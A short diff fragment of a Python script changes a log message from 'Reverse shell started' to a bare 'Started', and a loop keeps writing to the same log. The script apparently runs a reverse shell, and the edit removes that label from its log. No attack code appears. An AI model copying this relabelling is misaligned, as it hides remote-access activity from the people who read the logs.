@@ -16,7 +16,7 @@ def main():
         return
 
     with open(LOG, "w") as f:
-        f.write("Reverse shell started\n")
+        f.write("Started\n")
 
     while True:
         with open(LOG, "a") as f:
